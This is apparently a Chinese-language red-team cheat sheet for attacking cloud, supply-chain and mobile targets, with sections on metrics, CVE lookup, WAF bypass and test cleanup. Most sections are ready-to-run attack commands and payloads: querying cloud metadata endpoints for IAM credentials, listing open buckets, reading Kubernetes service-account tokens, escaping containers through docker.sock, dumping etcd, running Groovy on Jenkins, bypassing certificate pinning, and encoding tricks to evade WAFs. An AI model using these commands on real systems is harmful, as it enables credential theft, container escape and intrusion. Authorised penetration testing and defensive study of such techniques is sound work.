# 云原生 / 供应链 / 移动端攻击面

## 一、云原生（★ 原版完全缺失的一段）

从"文件上传→webshell"到"后渗透"之间，云环境有独立的攻击链。

### 1. 云元数据服务（IMDS）——SSRF 的终极目标

```bash
# AWS
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/meta-data/iam/security-credentials/
http://169.254.169.254/latest/meta-data/iam/security-credentials/<role-name>
http://169.254.169.254/latest/user-data/            # 启动脚本常含密钥
# IMDSv2 需要 token
TOKEN=$(curl -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")
curl -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/

# 阿里云
http://100.100.100.200/latest/meta-data/
http://100.100.100.200/latest/meta-data/ram/security-credentials/
http://100.100.100.200/latest/user-data

# 腾讯云
http://metadata.tencentyun.com/latest/meta-data/
http://metadata.tencentyun.com/latest/meta-data/cam/security-credentials/

# GCP（需 header）
curl -H "Metadata-Flavor: Google" http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token

# Azure
http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/
（需 header: Metadata: true）
```

**拿到临时凭据后**：
```bash
# AWS
aws configure set aws_access_key_id <AK>
aws configure set aws_secret_access_key <SK>
aws configure set aws_session_token <TOKEN>
aws sts get-caller-identity
aws s3 ls
aws ec2 describe-instances

# 阿里云
aliyun configure set --access-key-id <AK> --access-key-secret <SK>
aliyun sts GetCallerIdentity
```

### 2. 对象存储桶枚举

```bash
# 桶名猜测规则
company-backup / company-dev / company-static / company-assets
company-uploads / company-prod / company-logs / company-db-backup
company + 年份 / company + 环境名

# AWS S3
aws s3 ls s3://bucket-name --no-sign-request        # 匿名列桶
aws s3 cp s3://bucket/backup.sql . --no-sign-request
curl https://bucket.s3.amazonaws.com/?list-type=2

# 阿里云 OSS
curl http://bucket.oss-cn-hangzhou.aliyuncs.com/?list-type=2

# 腾讯云 COS
curl http://bucket.cos.ap-guangzhou.myqcloud.com/

# 工具
s3scanner  cloud_enum  trufflehog  S3Scanner
```

**常见错误配置**：ListBucket 公开、PutBucket 公开（可传恶意文件）、ACL 可写。

### 3. K8s 未授权与逃逸

```bash
# API Server 未授权（6443/8080）
curl -k https://<ip>:6443/api/v1/namespaces
curl -k https://<ip>:10250/pods              # kubelet 未授权
curl -k https://<ip>:10255/pods

# 容器内：ServiceAccount token
cat /var/run/secrets/kubernetes.io/serviceaccount/token
cat /var/run/secrets/kubernetes.io/serviceaccount/namespace
kubectl --token=$(cat ...token) --server=https://kubernetes.default.svc \
        --insecure-skip-tls-verify auth can-i --list

# etcd 未授权（2379）—— 直接读全集群数据
etcdctl --endpoints=http://<ip>:2379 get / --prefix --keys-only

# 容器逃逸路径
① 特权容器        capsh --print | grep -i "cap_sys_admin"
                  fdisk -l && mount /dev/sda1 /mnt
② Docker Socket   ls /var/run/docker.sock
                  docker -H unix:///var/run/docker.sock run -v /:/host -it alpine chroot /host
③ hostPID + hostPath  直接写宿主机文件
④ 内核漏洞        CVE-2022-0847 (DirtyPipe)、CVE-2016-5195 (DirtyCow)
⑤ cgroup release_agent
⑥ 挂载 docker.sock 或 containerd.sock
```

### 4. CI/CD 投毒

```
# GitHub Actions
- 检查 pull_request_target 误用（可在仓库上下文跑 PR 代码）
- 检查 workflow 中 ${{ github.event.pull_request.title }} 直接拼接（命令注入）
- 检查是否使用未固定的第三方 action（@master 而非 @sha）
- Secrets 是否在 PR 中泄露（echo ${{ secrets.X }}）

# Jenkins
未授权脚本控制台：/script  /manage  /computer/(master)/script
curl http://jenkins:8080/scriptText  可直接执行 Groovy

# GitLab CI
.gitlab-ci.yml 中未保护变量
Runner 注册 token 泄露 → 注册恶意 runner
```

### 5. Serverless / 云函数

```
环境变量泄露（常含数据库口令、API key）
事件注入：构造恶意事件触发函数
函数 URL 未鉴权访问
```

---

## 二、供应链攻击

```
① 依赖投毒
   npm 依赖混淆（内部包名被公开包抢占）
   PyPI / npm 抢注内部包名
   检查：package.json 中未锁定版本、使用非官方源

② 开源组件 CVE
   拿指纹版本 → 查 CVE → 找 EXP
   工具：nuclei -t cves/  |  searchsploit  |  GitHub Advisory

③ 构建链污染
   篡改构建脚本、注入恶意依赖
   检查：npm postinstall / setup.py / Makefile

④ 第三方资源
   前端引用的 CDN 资源是否可控（可劫持 → XSS/挂马）
   检查：<script src="http://..."> 无 SRI 校验
```

---

## 三、移动端 / API-first 目标（★ 原版缺失整条链）

### 五步法

```
① 取包
   Android  APK：apkpure / apkcombo / 官网直接下载
   iOS      IPA：frida-ios-dump（需越狱）/ 抓包工具导出

② 反编译
   Android  apktool d app.apk          # 资源 + smali
            jadx-gui app.apk           # 反编译成 Java（推荐）
            apkid app.apk              # 加壳检测
   iOS      class-dump / Hopper / IDA

   重点看：硬编码密钥、API 域名、加密算法、签名逻辑

③ 抓包
   常规：Burp 代理 + 手机安装信任证书
   Android 7+ 证书需装到系统区（root）或改 network_security_config
   iOS 需在设置里信任证书

④ 证书固定绕过（Certificate Pinning）
   Android  Frida 脚本（最常用）：
            frida -U -f com.target.app -l unpinning.js
            常用脚本：frida-multiple-unpinning.js
            objection：objection -g com.target.app explore
                       android sslpinning disable
   iOS      SSL Kill Switch 3 / objection ios sslpinning disable
   静态改包：apktool 反编译 → 改 network_security_config.xml → 重新签名

⑤ 双账号越权矩阵（★ 移动端最高价值）

   准备 A、B 两个账号，各自抓包存下所有请求，然后交叉重放：

   | 测试项 | 方法 | 预期漏洞 |
   |---|---|---|
   | 水平越权 | A 的 token + B 的资源ID | 能读/改 B 的数据 |
   | 垂直越权 | 普通号 token + 管理员接口 | 能调管理功能 |
   | 未授权访问 | 去掉 token 直接请求 | 接口无鉴权 |
   | 参数篡改 | 改 userId/orderId 遍历 | IDOR |
   | 批量遍历 | 循环请求 ID 段 | 可批量拖取 |
   | 越权写 | A 的 token 改 B 的资料 | 数据篡改 |

   自动化：把抓到的请求导入 Burp → Authz 插件 → 自动替换 token 重放
```

### 移动端特有检查项

```
□ 本地存储：shared_prefs / SQLite / Keychain 里的敏感数据
□ 日志泄露：adb logcat | grep -i "password\|token"
□ 硬编码：grep -rE "AKID|AKIA|api[_-]?key|secret" 反编译产物
□ 组件暴露：AndroidManifest 中 exported="true" 的 Activity/Service/Receiver
□ WebView：addJavascriptInterface / setAllowFileAccess
□ 篡改检测/root 检测绕过：Frida 脚本 hook
□ 加固壳：需脱壳（frida-dexdump / FART）
```

---

## 四、红队 / 紫队成果度量（★ 补充）

### 有效度量指标

```
红队视角
  首次落地时间  从开始到第一个shell的时间
  横向深度      拿到几个独立系统
  权限高度      最高拿到什么权限（域管/云管）
  隐蔽时长      多久被发现
  目标达成率    预设目标完成几个

紫队视角（防守验证）
  检测覆盖率    哪些攻击动作产生了告警
  MTTD          平均检测时间
  MTTR          平均响应时间
  漏报清单      哪些动作完全没被发现 ← 最有价值
```

### 紫队协作要点

```
1. 红队每完成一个动作，标记时间戳 + 技术编号（ATT&CK）
2. 蓝队对照日志，回答"发现了没有 / 多久发现"
3. 输出三张表：已检测 / 检测但延迟 / 完全漏报
4. 漏报项转化为检测规则的需求
```

**ATT&CK 编号要标**：
```
T1190 利用公开应用漏洞    T1078 有效账户
T1059 命令执行            T1003 凭据转储
T1021 远程服务            T1566 钓鱼
```

---

## 五、CVE 检索链

```bash
# 有版本号时的完整链路
① 指纹识别拿版本
   whatweb / nmap -sV / 页面报错 / 静态资源版本号

② 查组件 CVE
   searchsploit apache 2.4.49
   nuclei -u <url> -t cves/
   https://github.com/nomi-sec/PoC-in-GitHub

③ 在线库
   cve.mitre.org  nvd.nist.gov
   vulners.com    cvedetails.com
   GitHub Advisory Database

④ 中文组件（国内系统高发）
   泛微 / 致远 / 用友 / 蓝凌 / 通达OA / 金蝶
   ThinkPHP / Shiro / Fastjson / Log4j2

⑤ 无版本号时
   按报错特征搜（把报错原文丢搜索引擎）
   按图标hash在FOFA找同款（可能有已知版本）
```

---

## 六、WAF 绕过实战手法

```
① 编码层
   双重URL编码   %2527 → %27 → '
   十六进制       0x27
   Unicode        %u0027
   大小写混写     SeLeCt
   注释分隔       /**/  / *!*/  （MySQL内联注释 /*!50000SELECT*/）
   空白替换       %09 %0a %0b %0c %0d /**/ +

② 参数层
   参数污染       ?id=1&id=2（不同中间件取不同值）
   分块传输       Transfer-Encoding: chunked
   参数名变形     id[]=1 / id=1%00
   HTTP/2 特性    分帧绕过

③ 协议层
   改 Content-Type     application/json ↔ x-www-form-urlencoded
   改请求方法         POST → PUT / PATCH / DELETE
   改 HTTP 版本       1.1 ↔ 2
   大小写             <script> → <ScRiPt>
   multipart 边界注入

④ 语义层
   等价函数           sleep() → benchmark() / 笛卡尔积
   等价语法           ' OR 1=1 → ' || '1'='1
   分步利用           先写文件再包含，绕过单次检测

⑤ 架构层
   找源站IP绕过WAF（查DNS历史、证书、FOFA按IP搜）
   走 IPv6 / 非标端口
   用 CDN 回源绕过
   本地 hosts 指向源站

⑥ 检测原则
   先确认 WAF 类型（wafw00f）
   每次只改一个变量，观察拦截变化
   记录哪些 payload 被拦，反推规则
```

---

## 七、测试数据管理

```
① 测试前
   备份目标数据（快照/导出），记录基线状态
   准备专用测试账号（不与真实用户混淆）
   准备回滚方案

② 测试中
   只创建必要的测试数据，用完即删
   不在生产环境做破坏性操作
   如需写操作，先用测试账号验证，再考虑是否动真实数据

③ 测试后
   删除所有测试账号、测试订单、测试数据
   还原被修改的配置
   核对数据条数与基线一致
   全部动作记录在报告附录
```
